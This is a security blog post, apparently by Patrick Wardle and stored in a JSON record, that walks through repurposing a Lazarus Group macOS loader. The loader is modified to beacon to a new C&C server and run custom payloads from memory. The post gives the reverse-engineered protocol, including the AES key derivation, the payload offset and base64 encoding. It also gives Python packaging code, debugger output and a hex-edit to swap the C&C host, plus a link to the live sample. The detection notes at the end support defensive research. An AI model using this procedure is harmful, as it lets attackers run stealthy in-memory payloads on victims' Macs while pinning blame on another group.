{
    "id": "f3deb698-28a0-47de-8ed7-ec9a9443cb79",
    "created_at": "2023-01-12T14:59:35.085828Z",
    "updated_at": "2025-03-27T02:17:22.899297Z",
    "deleted_at": null,
    "sha1_hash": "b0f177b251e2bdaf369010a960e0acd1a98a54df",
    "title": "2020-02-22 - Weaponizing a Lazarus Group Implant- repurposing a 1st-stage loader, to execute custom 'fileless' payloads",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:14Z",
    "file_modification_date": "2022-05-29T01:23:14Z",
    "file_size": 4494079,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x54.html**\n\nWeaponizing a Lazarus Group Implant\n\nrepurposing a 1st-stage loader, to execute custom 'fileless' payloads\n\nby: Patrick Wardle / February 22, 2020\n\nOur research, tools, and writing, are supported by the \"Friends of Objective-See\" such as:\n\n[CleanMy Mac X](https://macpaw.com/cleanmymac)\n\nMalwarebytes\nAiro AV\n\n[Become a Friend!](https://objective-see.com/friends.html)\nüìù üëæ Want to play along?\n[I‚Äôve added the sample (‚ÄòOSX.AppleJeus.C‚Äô) to our malware collection (password: infect3d)](https://objective-see.com/downloads/malware/AppleJeus.zip)\n\n‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\nRecently a new piece of macOS malware was discovered:\n\n[Another #Lazarus](https://twitter.com/hashtag/Lazarus?src=hash&ref_src=twsrc%5Etfw) [#macOS](https://twitter.com/hashtag/macOS?src=hash&ref_src=twsrc%5Etfw) [#trojan](https://twitter.com/hashtag/trojan?src=hash&ref_src=twsrc%5Etfw)\n\nmd5: 6588d262529dc372c400bef8478c2eec\n\nhxxps://unioncrypto.vip/\n\nContains code: Loads Mach-O from memory and execute it / Writes to a file and\n[execute it@patrickwardle](https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw) [@thomasareed](https://twitter.com/thomasareed?ref_src=twsrc%5Etfw) [pic.twitter.com/Mpru8FHELi](https://t.co/Mpru8FHELi)\n\n[‚Äî Dinesh_Devadoss (@dineshdina04) December 3, 2019](https://twitter.com/dineshdina04/status/1201834142704394242?ref_src=twsrc%5Etfw)\n\nIn a previous [blog post I analyzed this intriguing specimen (internally named](https://objective-see.com/blog/blog_0x51.html) `macloader ),`\ncreated by the (in)famous Lazarus group.\n\n\n-----\n\nThis post highlighed its:\n\nPersistence:\n```\n   /Library/LaunchDaemons/vip.unioncrypto.plist ->\n   /Library/UnionCrypto/unioncryptoupdater\n\n```\nCommand and Control (C&C) Server:\n\n```\nhttps://unioncrypto.vip/update\n\n```\n\nCapabilities:\nThe in-memory execution of a remotely downloaded payloads.\n\n[For a full technical analysis of the sample, read my writeup: ‚ÄúLazarus Group Goes ‚ÄòFileless‚Äô‚Äù](https://objective-see.com/blog/blog_0x51.html)\n\nWhile many aspects of the malware, such as its (launch daemon) persistence mechanism\nare quite prosaic, its ability to directly execute downloaded (‚Äú2nd-stage‚Äù) payloads directly\nfrom memory is rather unique. Besides increasing stealth and complicating forensics\nanalysis of said payloads (as they never touch the file-system), it‚Äôs just plain sexy!\n\nIt also makes for the perfect candidate for ‚Äúrepurposing‚Äù, which is what we‚Äôll walk-thru today.\n\n## Repurposing Malware\n\n[At DefCon #27, I gave a talk titled, ‚ÄúHarnessing Weapons of Mac Destruction‚Äù, which detailed](https://speakerdeck.com/patrickwardle/harnessing-weapons-of-mac-destruction)\nthe process of repurposing (or ‚Äúrecycling‚Äù) other peoples‚Äô Mac malware:\n\nWatch Video At:\n\nhttps://youtu.be/InL3YA_6P6s\n\n\n-----\n\nIn a nutshell, the idea is take existing malware and reconfigure ( repurpose or recycle ) it\nfor your own surreptitious purposes (i.e. testing, red-teaming, offensive cyber-operations,\netc):\n\nThe talk also covered the many benefits of repurposing others‚Äô malware; benefits that\nbasically boil down to the fact that various well-funded groups and agencies are creating\nfully-featured malware, so why not leverage their hard work ‚Ä¶in a way (that if discovered)\nwill likely be (mis)attribute back to them?\n\n\n-----\n\n‚Ä¶IMHO, it s a lovely idea üòá\n\n[To view the full slides from my talk, checkout: ‚ÄúHarnessing Weapons of Mac Destruction‚Äù](https://speakerdeck.com/patrickwardle/harnessing-weapons-of-mac-destruction)\n\nThe Lazarus group‚Äôs malware we‚Äôre looking at today is a perfect candidate for repurposing.\nWhy? As a 1 -stage loader, it simply beacons out to a remote server for 2st nd-stage payloads\n(which as noted, are executed directly from memory). Thus once we understand its protocol\nand the expected format of the payloads, (in theory) it should be rather trivial to repurpose\nthe loader to communicate instead with our server, and thus stealthily execute our own 2ndstage payloads!\n\n\nThis gives us ‚Äòaccess‚Äô then, to an advanced 1 -stage loader that will execute our customst\npayloads (from memory!) ‚Ä¶without us having to write a single-line of (client-side) code. üòé\n\nBetter yet, as the repurposing-modifications will be minimal, if this repurposed sample is ever\ndetected, it surely well be (mis)attributed back to the original authors (and as our 2nd-stage\npayloads never hit the file-system, will more than likely remain undetected) üòéüòé #winning\n\n## Repurposing Lazarus‚Äôs Loader\n\n\nAfter identifying a malware specimen to repurpose (‚Äúrecycle‚Äù), the next step is to\ncomprehensively understand how it works:\n\nThe goal of this analysis phase is to:\n\nIdentify the method of persistence\nUnderstand the capabilities / payload\nIdentify the command & control server\n\n\n-----\n\nUnderstand the communications protocol\n\n[In a previous blog post, ‚ÄúLazarus Group Goes ‚ÄòFileless‚Äô‚Äù we thoroughly analyzed the sample](https://objective-see.com/blog/blog_0x51.html)\nand answered the majority of these questions.\n\nHowever, I did not discuss the malware‚Äôs communications protocol, specifically the format of\nthe response from the remote server ‚Ä¶the response that contains the 2nd-stage payload(s).\nAs our ultimate goal is to repurpose this malware such that it executes our own 2nd-stage\npayloads, this protocol and payload format is essential to understand!\n\n\nTo facilitate dynamic analysis and to understand the malware protocol, I created a simple\npython HTTPS server that would respond to the malware‚Äôs requests.\n\nAlthough (initially) I did not know the expected format of the data, trial and error (plus a\nhealthy dose of reverse-engineering) proved sufficient!\n```\n# python server.py\n [+] awaiting connections\n [+] new connection from 192.168.0.2:\n ======= POST HEADERS =======\n Host: unioncrypto.vip\n Accept: */*\n auth_signature: ca57054ea39f84a6f5ba0c65539a0762\n auth_timestamp: 1581048662\n Content-Length: 62\n Content-Type: application/x-www-form-urlencoded\n ======= POST BODY =======\n MiniFieldStorage('act', 'check')\n MiniFieldStorage('ei', 'Mac OS X 10.15 (19A603)')\n MiniFieldStorage('rlz', 'VMI5EOhq8gDz')\n MiniFieldStorage('ver', '1.0')\n [06/Feb/2020 20:11:08] \"POST /update HTTP/1.1\" 200 \n```\nArmed with a simple (initially bare-boned) custom C&C server to respond to the malware‚Äôs\nrequests, we can begin to understand the network protocol, with the ultimate goal of\nunderstanding how the 2nd-stage payloads should be remotely delivered to the malicious\nloader, on infected systems.\n\nFirst, we note that on check in the malware provides some (basic) information after the\ninfected system (e.g. the macOS version/build number: `Mac OS X 10.15 (19A603), serial`\nnumber: `VMI5EOhq8gDz, etc.), and implant version ( 'ver', '1.0' ).`\n\n\n-----\n\nMoving on we can hop into a disassembler to look at the malware s code responsible for\nconnecting to the C&C server, and parsing/processing the server‚Äôs response.\n\nIn the malware‚Äôs disassembly we find a function named `onRun() that invokes a method`\nnamed `Barbeque::post . This method connects to the remote server`\n( https://unioncrypto.vip/ ) and expects the server to respond with an `HTTP 200 OK .`\nOtherwise it takes a nap (before trying again):\n```\n1int onRun() {\n2  \n3  ...\n4\n5  //connect to server\n6  Barbeque::post(...);\n7  if(response != 200) goto sleep;\n8  \n9}\n\n```\nAssuming the (our) server responds with an `HTTP 200 OK, the malware checks that at`\nleast `0x400 bytes were received, before base64-decoding said bytes:`\n```\n 1int onRun() {\n 2  \n 3  ...\n 4\n 5  //rdx: # of bytes\n 6  // make sure at least 0x400 bytes were recv'd\n 7  if ((rdx >= 0x400) && ...))) \n 8  {\n 9\n10   //rbx: recv'd bytes\n11   // base64 decond recv'd bytes\n12   rax = base64_decode(rbx, &var_80);\n13\n14   ...\n15}\n\n```\n‚Ä¶so already, we know the server‚Äôs response (which the malware expects to be a 2nd-stage\npayload) must be at least `0x400 in length ‚Ä¶and base64 encoded. As such, we update our`\ncustom C&C server to respond with at least `0x400 bytes of base64 encoded data (that for`\nnow, just decodes to `ABCDEFGHIJKLMNOPQRSTUVWXYZABCD... ).`\n\nOnce we respond with the correct number ( 0x400 +) of base64 encoded bytes, the malware\nhappily continunes and invokes a function named `processUpdate (at address`\n```\n0x0000000100004be3 ). In a debugger, we can see this function takes the (base64\n\n```\ndecoded) bytes (in `RDI ) and their length (in` `RSI ):`\n\n\n-----\n\n```\n$ lldb unioncryptoupdater\n...\n(lldb) b 0x0000000100004be3\nBreakpoint 1: where = unioncryptoupdater`processUpdate(unsigned char*, unsigned\nlong), address = 0x0000000100004be3\n(lldb) r\n...\n(lldb) Process 2813 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1\nframe #0: 0x0000000100004be3 unioncryptoupdater`processUpdate(unsigned char*,\nunsigned long)\n(lldb) (lldb) x/s $rdi\n0x100800600:\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ...\n(lldb) reg read $rsi\nrsi = 0x000000000000401\n\n```\nAs shown in the debugger output, so far, the malware is content with our server‚Äôs response,\nas the response is over `0x400 bytes in length and encoded correctly. (Note our decoded`\nbytes, `ABC... in the` `rdi register).`\n\nIn the previous [blog post, we noted that the](https://objective-see.com/blog/blog_0x51.html) `processUpdate function calls into a method`\nnamed `load_from_memory to, well, load (and execute) the received bytes ‚Ä¶the 2nd-stage`\npayload(s). However, before it invokes this function it calls two other functions:\n```\n   md5_hash_string\n   aes_decrypt_cbc\n 1int processUpdate(int * arg0, long arg1) {\n 2  \n 3  ...\n 4\n 5  rax = md5_hash_string(&var_4D8);\n 6  r15 = rbx + 0x10;\n 7  rdx = r14 - 0x10;\n 8  if ((var_4D8 & 0x1) != 0x0) {\n 9    rcx = var_4C8;\n10  }\n11  else {\n12     rcx = &var_4D7;\n13  }\n14  _aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40);\n15}\n\n```\n\n-----\n\nLet s step thru this in a debugger to see what it s hashing, and what/how it s ( AES )\ndecrypting.\n\nUsing our simple python HTTPS (C&C) server we‚Äôll serve up again `0x400 + bytes of`\n```\nABCDEFGHIJKLMNOPQRSTUVWXYZABC... :\n$ lldb unioncryptoupdater\n(lldb) x/i $pc \n0x100004c58 : callq 0x100004dab ; md5_hash_string(...);\n//print out bytes passed to md5_hash_string()\n// recall that $rsi will contain the first arg\n(lldb) x/24bx $rsi\n0x100008388: 0x18 0x56 0x4d 0x49 0x35 0x45 0x4f 0x68\n0x100008390: 0x71 0x38 0x67 0x44 0x7a 0x00 0x00 0x00\n0x100008398: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n//print out as a string\n(lldb) x/s $rsi+1\n0x100008389: \"VMI5EOhq8gDz\"\n\n```\nStopping at the call to the `md5_hash_string function, we can dump the string being`\npassed in. Turns out it‚Äôs: `VMI5EOhq8gDz (albeit prefixed with` `0x18 ).`\n\nThe calling convention utilized by macOS is the ‚ÄúSystem V‚Äù 64-bit ABI ‚Ä¶which always\npasses the first argument in the `rsi register.`\n\n‚ÄúSystem V operating systems [and macOS] will use RDI, RSI, RDX, RCX, R8 and R9.\nXMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 will be used to pass\nfloating point parameters. RAX will hold the syscall number. Additional arguments are\npassed via the stack (right to left).\n\nReturn values are sent back via RAX.‚Äù\n\n[-64bit ABI Cheatsheet](https://tuttlem.github.io/2013/02/14/64bit-abi-cheatsheet.html)\n\nOnce the malware has generated an `MD5 hash of this string, it invokes the`\n```\naes_decrypt_cbc function. What does it pass in?\n\n```\nIn the disassembler, the `aes_decrypt_cbc function is invoked in the following manner:`\n```\n_aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40); Hopping back into the debugger\n\n```\nwe can determine what the `r15,` `rdx, and` `rcx registers hold:`\n\n\n-----\n\n```\n$ lldb unioncryptoupdater\n(lldb) x/i $pc \n0x100004c85 : callq 0x100004095 ; aes_decrypt_cbc\n(lldb) x/s $r15\n0x100800610: \"QRSTUVWXYZABCDEF...\n(lldb) reg read $rdx\nrdx = 0x00000000000003F1\n(lldb) x/16xb $rcx\n0x7ffeefbff279: 0x26 0x1d 0xfd 0xb9 0x70 0x43 0x84 0xf4\n0x7ffeefbff281: 0xf7 0x37 0xe0 0x1c 0x55 0x7a 0xee 0x74\n   r15 : appears to be a pointer into the received (now base64 decoded) bytes. Looking\n\n```\nback a few instructions in the disassembly we see: `r15 = rbx + 0x10 ( rbx is a`\npointer to the start of the received decoded bytes).\n\nThus, `r15 points exactly` `0x10 ( 16d ) bytes into the received, decoded bytes.`\n```\n   rdx : appears to be 0x10 less than the size of the total (received) decoded bytes.\n\n```\nAgain, a few instructions back, we see: `rdx = r14 - 0x10 ( r14 holds the total`\nsized of the received decoded bytes).\n\nIn other words, `rdx is the remaining size of the (received) decoded bytes (from` `r15`\nto the end!).\n```\n   rcx : appears initially to be a pointer some random/unknown bytes ( 0x26 0x1d 0xfd\n   0xb9 ... ). However, by looking back in the disassembly, we can see it‚Äôs the result of\n\n```\nhashing the `VMI5EOhq8gDz string!`\n\nWe can also confirm this, by manually ( MD5 ) hashing `VMI5EOhq8gDz, which results`\nin `0x26 0x1d 0xfd 0xb9 ... (matching` `rcx ):`\n```\n   1password = 'VMI5EOhq8gDz'\n   2key = hashlib.md5(password).digest()\n   3\n   4print('\\nkey: '),\n   5for i in range(len(key)):\n   6  print('%x' % (ord(key[i]))),\n   7}\n\n```\n‚Ä¶which prints out the (expected) `key: 26 1d fd b9 70 43 84 f4 f7 37 e0 1c 55`\n```\n   7a ee 74\n\n```\nWe now understand the parameters passed to the `aes_decrypt_cbc function:`\n\n\n-----\n\n```\n   arg 0 ( 0x0 ): likely the iv ( NULL )\n   arg 1 (from $r15 ): pointer to cipher text\n   arg 2 (from $rdx ): length of cipher text\n   arg 3 (from $rcx ): key ( MD5 of the string VMI5EOhq8gDz )\n   arg 4 ( &var_40 ): aes ‚Äúcontext‚Äù\n\n```\nThus, the malware is ( AES ) decrypting the received (now base64 decoded) payload, with\nkey = `MD5(\"VMI5EOhq8gDz\") .`\n\nAfter decrypting the received bytes, the malware initializes a pointer `0x90 bytes into the`\nreceived bytes, and a variable with the size of the remaining bytes, before invoking the\n```\nload_from_memory function:\n1rbx = rbx + 0x90;\n2r14 = r14 - 0x90;\n3\n4rax = load_from_memory(rbx, r14, &var_C0, rcx, &var_40, r9);\n\n```\nBefore discussing the parameters passed to this function let‚Äôs update our custom C&C server\nto serve up the same data from a file ( ABCDEF... ), but this time `AES encrypted with the`\nhash of `\"VMI5EOhq8gDz\" . ‚Ä¶we also make sure to skip the first` `0x90 bytes (as the`\nmalware skips over these):\n```\n 1password = 'VMI5EOhq8gDz'\n 2key = hashlib.md5(password).digest()\n 3\n 4iv = 16 * '\\x00'\n 5encryptor = AES.new(key, AES.MODE_CBC, iv)\n 6\n 7with open(in_filename, 'rb') as infile:\n 8  with open(out_filename, 'wb') as outfile:\n 9    \n10    data += 0x10 * '\\x00'\n11    chunk = 0x80 * '\\x00'\n12    data += encryptor.encrypt(chunk)\n13\n14    while True:\n15      chunk = infile.read(chunksize)\n16      if len(chunk) == 0:\n17        break\n18      elif len(chunk) % 16 != 0:\n19        chunk += ' ' * (16 - len(chunk) % 16)\n20\n21      data += encryptor.encrypt(chunk)\n22    \n23    outfile.write(base64.b64encode(data))\n\n```\nSetting a breakpoint on the call to the `load_from_memory function`\n( 0x0000000100004cb8: call load_from_memory ), we can now dump the parameters\n(and confirm that the encryption in our custom C&C server is correct):\n\n\n-----\n\n```\n$ lldb unioncryptoupdater\n(lldb) x/i $pc \n0x100004cb8 : callq 0x100006dda ; load_from_memory\n//1st arg\n(lldb) x/s $rdi\n0x101002290: \"ABCDEFGHIJKLMNOPQRSTUVWXYZ...\n(lldb) reg read $rsi\nr14 = 0x0000000000000371\n\n```\nRecalling that the first and second arguments are passed in via the `rdi and` `rsi`\nregisters, respectfully, in the above debugger output we can see the malware is passing our\nnow decoded, decrypted ‚Äúpayload‚Äù ( ABC... ) and size, to the `load_from_memory function.`\n\nHooray, this confirms that our detailed analysis has correctly uncovered both the format,\nencoding, and encryption of the server‚Äôs expected response.\n\nIn summary:\n\nencoding: base64\nencryption: `AES ( CBC -mode), with a null-IV, and key of` `MD5(\"VMI5EOhq8gDz\")`\nformat: `0x400 + bytes, payload starting at offset` `0x90`\n\nAs we now fully understand the format of the malware‚Äôs protocol, in theory, we should be\nable remote transmit an encrypted & encoded binary payload and have the malware execute\ndirectly from memory!\n\n‚Ä¶but first a brief discussion of the malware‚Äôs ‚Äúload and execute from memory‚Äù code.\n\n[In my previous writeup, ‚ÄúLazarus Group Goes ‚ÄòFileless‚Äô‚Äù, I detailed exactly how the malware](https://objective-see.com/blog/blog_0x51.html)\nexecuted the 2nd-stage payload from memory. To (re)summarize:\n\nThe `load_from_memory function` `mmaps some memory (with protections:`\n```\n   PROT_READ | PROT_WRITE | PROT_EXEC ), then copies the decrypted payload into\n\n```\nthis memory region, before invoking a function named `memory_exec2 .`\n\nThe `memory_exec2 function invokes the Apple API`\n```\n   NSCreateObjectFileImageFromMemory to create an ‚Äúobject file image‚Äù from a\n\n```\nmemory buffer (of a `mach-O file) then invokes the` `NSLinkModule function to link the`\n‚Äúobject file image‚Äù.\n\nOnce the malware has mapped and linked the downloaded payload, it invokes a\nfunction named `find_macho which appears to search the memory mapping for`\n```\n   MH_MAGIC_64 ( 0xfeedfacf ), the 64-bit ‚Äúmach magic number‚Äù in the\n   mach_header_64 structure.\n\n```\n\n-----\n\nOnce the `find_macho method returns, the malware begins parsing the`\nmapped/linked ( mach-O ) payload, looking for the address of `LC_MAIN load`\ncommand ( 0x80000028 ), which contains information such as the entry point of the inmemory code.\n\nThe malware then retrieves the offset of the entry point (found at offset `0x8 within the`\n```\n   LC_MAIN load command), sets up some arguments, then jumps to this address, to\n\n```\nkick off the execution of the payloads binary code.\n```\n1//rcx points to the `LC_MAIN` load command\n2r8 = r8 + *(rcx + 0x8);\n3...\n4\n5//invoke payload's entry point!\n6rax = (r8)(0x2, &var_40, &var_48, &var_50, r8);\n\n```\nSkimming over the disassembly of the `memory_exec2 reveals some interesting code`\nsnippets, such as the following:\n```\n1//RDI points to the mach-O header (of the payload)\n2// offset 0xC in a mach-O header is file type (`uint32_t filetype`)\n3rbx = *(int32_t *)(rdi + 0xc);\n4if (rbx != 0x8) {\n5      *(int32_t *)(rdi + 0xc) = 0x8;\n6}\n\n```\nStepping thru this code in a debugger, reveals it is checking the type of the ( mach-O ) binary\npayload ( MH_EXECUTE, `MH_BUNDLE, etc). If the` `mach-O file type is not` `MH_BUNDLE`\n( 0x8 ), it updates the (in-memory) type to be this value: `*(rdi + 0xc) = 0x8 .`\n```\nProcess 2866 stopped\n* stop reason = breakpoint 1.1\nunioncryptoupdater`memory_exec2:\n-> 0x1000069c0 : cmpl  $0x8, %ebx   ;0x8: MH_BUNDLE\n  0x1000069c3 : je   0x1000069cc\n  0x1000069c5 : movl  $0x8, 0xc(%rdi)\n  0x1000069cc : leaq  -0x58(%rbp), %rdx\n(lldb) reg read $rbx\n    rbx = 0x0000000000000002 ;0x2: MH_EXECUTE\n\n```\n[This is done, (as online research notes) as the](https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html) `man page for` `NSModule state: ‚ÄúCurrently`\n_the implementation is limited to only Mach-O MH_BUNDLE types which are used for_\n_plugins.‚Äù Thus in order to play nicely with the Apple APIs and thus support the in-memory_\nexecution of ‚Äòstandard‚Äô `mach-O executables (type:` `MH_EXECUTE ), this ‚Äòpatch‚Äô must be`\napplied.\n\nHowever, the most interesting thing about this snippet of code found within the malware, is\nthat it‚Äôs not original‚Ä¶\n\n\n-----\n\nIn 2017, Cylance published a blog post titled: Running Executables on macOS From\nMemory‚Äù. Though the topic of in-memory code execution on macOS had been covered\nbefore (as was noted in the blog post), the post provided a comprehensive technical deepdive into the topic, and more importantly provided an open-source project which included\n[code to perform in-memory loading: ‚Äúosx_runbin‚Äù.](https://github.com/CylanceVulnResearch/osx_runbin)\n\nThe researcher (Stephanie Archibald), also presented this research (and more!) at an\nInfiltrate talk:\n\nHere we are learning modernized osx rootkits (userland) from Stephanie Archibald !\n[pic.twitter.com/rAsK4xqSBh](https://t.co/rAsK4xqSBh)\n\n[‚Äî Dave Aitel (@daveaitel) April 6, 2017](https://twitter.com/daveaitel/status/850039542698708992?ref_src=twsrc%5Etfw)\n\nIf we compare Cylance‚Äôs [osx_runbin code, it is trivial to see the in-memory loader code found](https://github.com/CylanceVulnResearch/osx_runbin)\nwithin the Lazarus‚Äôs group‚Äôs malware is nearly 100% the same:\n\n‚Ä¶in other words, the Lazarus group coders simply leveraged (copied/stole) the existing\nopen-source `osx_runbin code in order to give their loader, advanced stealth and anti-`\nforensics capabilities. And who can blame them? Work smart, not hard, right!? üòÖ\n\n\n-----\n\nThis is not the first time, I ve stumbled across shared code in macOS APT group malware\nspecimens.\n\n[See: ‚ÄúFrom Italy With Love? Finding HackingTeam code in Russian Malware‚Äù](https://objective-see.com/blog/blog_0x18.html)\n\nOk, so let‚Äôs start to wrap this all up, and (finally!) illustrate the full repurposing of the Lazarus\ngroup‚Äôs loader, so that it beacons to our C&C server to download and execute (from\nmemory), our 2nd-stage payloads!\n\nStep one is to modify the loader so that it beacons to our C&C server for tasking.\n\nLooking in the disassembler, we find the hardcoded address of the malware C&C server:\n```\nhttps://unioncrypto.vip/update :\n\n```\nPopping into a hexeditor, we can modify this to whatever URL or IP address we‚Äôd like the\nmalware to now connect to (i.e. to from `https://unioncrypto.vip/update to`\n```\nhttps://allyourbase.belong/ ):\n\n```\nOne the malware checks in:\n\n\n-----\n\n```\n# python server.py\n [+] awaiting connections\n [+] new connection from 192.168.0.2\n ======= POST HEADERS =======\n Host: allyourbase.belong\n Accept: */*\n auth_signature: ca57054ea39f84a6f5ba0c65539a0762\n auth_timestamp: 1581048662\n Content-Length: 62\n Content-Type: application/x-www-form-urlencoded\n ======= POST BODY =======\n MiniFieldStorage('act', 'check')\n MiniFieldStorage('ei', 'Mac OS X 10.15 (19A603)')\n MiniFieldStorage('rlz', 'VMI5EOhq8gDz')\n MiniFieldStorage('ver', '1.0')\n [06/Feb/2020 20:11:08] \"POST /update HTTP/1.1\" 200 \n```\n‚Ä¶we should be able to serve up our 2nd-stage payloads!\n\nStep two is to prepare and package up these payloads. This involves encrypting ( AES, key:\n```\nMD5(\"VMI5EOhq8gDz\") ) any mach-O binary and placing that at offset 0x90 within the\n\n```\nserver‚Äôs base64-encoded response.\n\nDuring our analysis phase, we had (already) put together some basic python code, to\nimplement this logic:\n\n\n-----\n\n```\n 1import os, random, struct, hashlib, base64\n 2from Crypto.Cipher import AES\n 3\n 4password = 'VMI5EOhq8gDz'\n 5key = hashlib.md5(password).digest()\n 6\n 7def encryptFile(key, in_filename, out_filename=None, chunksize=64*1024):\n 8  \n 9  iv = 16 * '\\x00'\n10  encryptor = AES.new(key, AES.MODE_CBC, iv)\n11 \n12  data = \"\"   \n13\n14  with open(in_filename, 'rb') as infile:\n15    with open(out_filename, 'wb') as outfile:\n16      \n17      data += 0x10 * '\\x00'\n18      chunk = 0x80 * '\\x00'\n19      data += encryptor.encrypt(chunk)\n20\n21      while True:\n22        chunk = infile.read(chunksize)\n23        if len(chunk) == 0:\n24          break\n25        elif len(chunk) % 16 != 0:\n26          chunk += ' ' * (16 - len(chunk) % 16)\n27\n28        data += encryptor.encrypt(chunk)\n29      \n30      outfile.write(base64.b64encode(data))\n31\n32encryptFile(key, 'payloadBEFORE', 'payloadAFTER')\n\n```\nNow we just need a test payload ‚Ä¶a standard `\"Hello World\" binary should suffice:`\n```\n1#import <Foundation/Foundation.h>\n2\n3int main(int argc, const char * argv[]) {\n4  @autoreleasepool {\n5    // insert code here...\n6    NSLog(@\"Hello, World!\");\n7  }\n8  return 0;\n9}\n\n```\nAfter compiling this `\"Hello World\" code into a` `mach-O binary, we run it thru our python`\n‚Äúdeployment‚Äù script which encrypts, encodes, and packages it all up:\n\n\n-----\n\n```\n$ python deploy.py \n[+] AES encrypting payload...\n[+] Base64 encoding payload...\n[+] payload ready for deployment!\n$ hexdump -C payload\n00000000 45 52 45 52 45 52 45 52 45 52 45 52 45 52 45 52 |ERERERERERERERER|\n00000010 45 52 45 52 45 58 73 7a 75 42 33 44 7a 4a 52 6e |EREREXszuB3DzJRn|\n00000020 7a 45 48 66 30 4c 42 4f 4d 66 50 41 37 5a 31 73 |zEHf0LBOMfPA7Z1s|\n00000030 4a 7a 50 39 58 78 7a 64 2b 37 4a 34 47 47 50 43 |JzP9Xxzd+7J4GGPC|\n00000040 47 52 44 73 68 46 52 2b 4e 32 75 66 61 47 45 42 |GRDshFR+N2ufaGEB|\n00000050 6e 46 6e 33 7a 45 43 45 50 52 6f 4e 57 32 63 67 |nFn3zECEPRoNW2cg|\n00000060 6f 52 7a 68 42 34 48 57 31 38 4c 42 35 48 48 4d |oRzhB4HW18LB5HHM|\n00000070 53 71 6f 4a 35 74 74 63 77 38 66 63 36 74 75 6d |SqoJ5ttcw8fc6tum|\n\n```\nNow, we simply modify our custom C&C server to serve up this processed payload when the\nrepurposed malware checks in with our server:\n```\n# python server.py\n [+] awaiting connections\n [+] new connection from 192.168.0.2\n ======= POST HEADERS =======\n Host: allyourbase.belong\n ...\n [+] responding with 2nd-stage payload (42264 bytes)\n\n```\nSetting a breakpoint within the `memory_exec2 function (specifically at`\n```\n0x0000000100006af6, the call into the payload‚Äôs main /entrypoint), allows us to confirm\n\n```\nthat our payload has been successfully transmitted to the remote (now repurposed) loader,\nunpackaged, decoded, and decrypted successfully:\n\n\n-----\n\n```\n(lldb) b 0x0000000100006af6\nBreakpoint 2: where = unioncryptoupdater`memory_exec2 + 343\n...\nProcess 2866 stopped\n* thread #1, stop reason = breakpoint 2.1\nunioncryptoupdater`memory_exec2 + 343:\n-> 0x100006af6 : callq *%r8\n(lldb) x/10i $r8\n  0x201800f20: 55          pushq %rbp\n  0x201800f21: 48 89 e5       movq  %rsp, %rbp\n  0x201800f24: 48 83 ec 20      subq  $0x20, %rsp\n  0x201800f28: c7 45 fc 00 00 00 00 movl  $0x0, -0x4(%rbp)\n  0x201800f2f: 89 7d f8       movl  %edi, -0x8(%rbp)\n  0x201800f32: 48 89 75 f0      movq  %rsi, -0x10(%rbp)\n  0x201800f36: e8 33 00 00 00    callq 0x201800f6e      \n  0x201800f3b: 48 8d 35 c6 00 00 00 leaq  0xc6(%rip), %rsi   ; @\"Hello,\nWorld!\"\n  0x201800f42: 48 89 f7       movq  %rsi, %rdi\n  0x201800f45: 48 89 45 e8      movq  %rax, -0x18(%rbp)\n  0x201800f49: b0 00         movb  $0x0, %al\n  0x201800f4b: e8 12 00 00 00    callq 0x201800f62      ; NSLog\n\n```\n‚Ä¶and if we continue ( c ), our 2nd-stage payload is successfully executed on the infected\nsystem, directly from memory!\n```\n(lldb) c\nProcess 2866 resuming\n2020-02-17 23:34:30.606876-0800 unioncryptoupdater[2866:213719] Hello, World!\n...\n$ log show | grep \"Hello, World\"\n2020-02-17 23:34:30.606982-0800 unioncryptoupdater: (core) Hello, World!\n\n```\nHooray, we‚Äôre stoked! ü•≥\n\n## Detection\n\nBefore ending, I want to briefly discuss detection of this threat (either in it‚Äôs pristine or\nrepurposed state).\n\nFirst, it‚Äôs rather trivial to detect the malware‚Äôs (launch daemon) persistence (e.g. via\n[BlockBlock):](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\nOur firewall [LuLu will also detects the unauthorized network traffic to the attacker (or our!)](https://objective-see.com/products/lulu.html)\nC&C server:\n\nAnd what about detecting the in-memory execution of 2nd-stage payloads? Turns out that‚Äôs a\nbit tricker (which is one of the reasons why attacker have begun to utilize this technique!).\n\nGood news though (from the detection point of view), the well-known macOS security\n[researcher (and former #OBTS speaker!) Richie Cyrus recently published a blog post that](https://twitter.com/rrcyrus)\nincluded a section titled: ‚ÄúUsing ESF to Detect In-Memory Execution‚Äù\n\nFor the past few months, I've been diving into Apple's Endpoint Security Framework.\nThis post shares how I use the framework for detection engineering purposes.\n[https://t.co/jhTnxXYlAS](https://t.co/jhTnxXYlAS) [pic.twitter.com/PEpNy4v7jV](https://t.co/PEpNy4v7jV)\n\n[‚Äî Richie Cyrus (@rrcyrus) January 30, 2020](https://twitter.com/rrcyrus/status/1222906150125035520?ref_src=twsrc%5Etfw)\n\n\n-----\n\nIn his, post he notes that via Apple s new Endpoint Security Framework (ESF), we can track\nvarious events, such as memory mappings ( ES_EVENT_TYPE_NOTIFY_MMAP ) which (when\ncombined with other observable events delivered by the ESF) may be used to detect the\nexecution of an in-memory payload:\n\n\"Of the event types, ES_EVENT_TYPE_NOTIFY_MMAP stands out as there was a\ncall to mmap in the PoC code which generated the Calculator execution...\"\n\nUnfortunately, without a kernel extension (which Apple is rapidly deprecating), as far as I\nknow, there is no way to dump a process‚Äôs memory contents. Thus even if we are to detect\nthat a 2nd-stage payload is executing from memory, we won‚Äôt be to capture the payload (i.e.\ndump it from memory). Apple, a little help here!?\n\nFor more on the topic of memory forensics on macOS, check out the following (insightful!)\nthread:\n\nMemory scanning capabilities on macOS are pretty bad in general. But this abolition of\nkexts for macOS will definitely make it impossible to access the memory if no access to\n[kernel mode will be possible. https://t.co/TbBHOsnG55](https://t.co/TbBHOsnG55)\n\n[‚Äî Matt Suiche (@msuiche) February 9, 2020](https://twitter.com/msuiche/status/1226390783768637440?ref_src=twsrc%5Etfw)\n\n## 